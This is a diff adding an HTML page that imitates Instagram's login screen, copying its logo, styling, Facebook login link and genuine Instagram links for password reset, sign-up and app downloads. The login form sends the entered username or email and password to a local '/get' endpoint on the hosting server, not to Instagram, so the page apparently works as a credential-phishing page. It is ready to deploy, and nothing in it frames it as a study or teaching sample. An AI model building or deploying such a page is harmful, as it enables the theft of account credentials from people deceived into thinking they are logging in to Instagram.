@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+
+        .container {
+            width: 350px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo svg {
+            width: 175px;
+            height: 51px;
+        }
+
+        .form-group {
+            margin-bottom: 6px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 9px 8px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 12px;
+            outline: none;
+            margin-bottom: 6px;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+        }
+
+        .button {
+            width: 100%;
+            padding: 7px 16px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .button:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+            cursor: default;
+        }
+
+        .or-divider {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            margin: 20px 0;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .or-divider::before,
+        .or-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .or-divider::before {
+            margin-right: 18px;
+        }
+
+        .or-divider::after {
+            margin-left: 18px;
+        }
+
+        .facebook-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 8px 0;
+        }
+
+        .facebook-login svg {
+            margin-right: 8px;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin-top: 12px;
+        }
+
+        .signup-container {
+            width: 350px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .signup-text {
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .app-download-text {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 15px;
+        }
+
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .app-buttons img {
+            height: 40px;
+            cursor: pointer;
+        }
+
+        @media (max-width: 400px) {
+            .container, .signup-container {
+                width: 100%;
+                border: none;
+                background: none;
+            }
+            
+            body {
+                background: #fff;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="90" height="120">
+                <defs>
+                    <linearGradient id="instaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" style="stop-color:#f09433; stop-opacity:1" />
+                        <stop offset="25%" style="stop-color:#e6683c; stop-opacity:1" />
+                        <stop offset="50%" style="stop-color:#dc2743; stop-opacity:1" />
+                        <stop offset="75%" style="stop-color:#cc2366; stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#bc1888; stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+                <path fill="url(#instaGradient)" d="M12 2.2c3.2 0 3.6 0 4.8.1 1.1.1 1.8.2 2.3.4.6.3 1 .6 1.5 1.1s.8.9 1.1 1.5c.2.5.3 1.2.4 2.3.1 1.2.1 1.6.1 4.8s0 3.6-.1 4.8c-.1 1.1-.2 1.8-.4 2.3-.3.6-.6 1-.9 1.4s-.9.8-1.5 1.1c-.5.2-1.2.3-2.3.4-1.2.1-1.6.1-4.8.1s-3.6 0-4.8-.1c-1.1-.1-1.8-.2-2.3-.4-.6-.3-1-.6-1.5-1.1-.4-.4-.8-.9-1.1-1.5-.2-.5-.3-1.2-.4-2.3C2.2 15.6 2.2 15.2 2.2 12s0-3.6.1-4.8c.1-1.1.2-1.8.4-2.3.3-.6.6-1 .9-1.5.5-.5.9-.8 1.5-1.1.5-.2 1.2-.3 2.3-.4C8.4 2.2 8.8 2.2 12 2.2m0-2.2C8.8 0 8.4 0 7.2.1c-1.3.1-2.2.3-3 .6-.8.4-1.5.8-2.2 1.5s-1.1 1.4-1.5 2.2c-.3.8-.5 1.7-.6 3-.1 1.2-.1 1.6-.1 4.8s0 3.6.1 4.8c.1 1.3.3 2.2.6 3 .4.8.8 1.5 1.5 2.2s1.4 1.1 2.2 1.5c.8.3 1.7.5 3 .6 1.2.1 1.6.1 4.8.1s3.6 0 4.8-.1c1.3-.1 2.2-.3 3-.6.8-.4 1.5-.8 2.2-1.5s1.1-1.4 1.5-2.2c.3-.8.5-1.7.6-3 .1-1.2.1-1.6.1-4.8s0-3.6-.1-4.8c-.1-1.3-.3-2.2-.6-3-.4-.8-.8-1.5-1.5-2.2-.7-.7-1.4-1.1-2.2-1.5-.8-.3-1.7-.5-3-.6-1.2-.1-1.6-.1-4.8-.1z"/>
+                <path fill="url(#instaGradient)" d="M12 5.8A6.2 6.2 0 1 0 12 18.2 6.2 6.2 0 1 0 12 5.8zm0 10.2A4 4 0 1 1 12 7.8a4 4 0 1 1 0 8z"/>
+                <circle fill="url(#instaGradient)" cx="18.4" cy="5.6" r="1.44"/>
+            </svg>
+        </div>
+
+        <form action="/get" id="login-form">
+            <input name="email" class="input-field" type="text" placeholder="Phone number, username, or email" required>
+            <input name="password" class="input-field" type="password" placeholder="Password" required>
+            <button type="submit" class="button">Log in</button>
+        </form>
+
+        <div class="or-divider">OR</div>
+
+        <a href="#" class="facebook-login">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#385185" viewBox="0 0 24 24">
+                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+            </svg>
+            Log in with Facebook
+        </a>
+
+        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
+    </div>
+
+    <div class="signup-container">
+        <p class="signup-text">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-link">Sign up</a></p>
+    </div>
+
+    <div class="app-download">
+        <p class="app-download-text">Get the app.</p>
+        <div class="app-buttons">
+            <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store">
+            </a>
+            <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play">
+            </a>
+        </div>
+    </div>
+</body>
+</html>
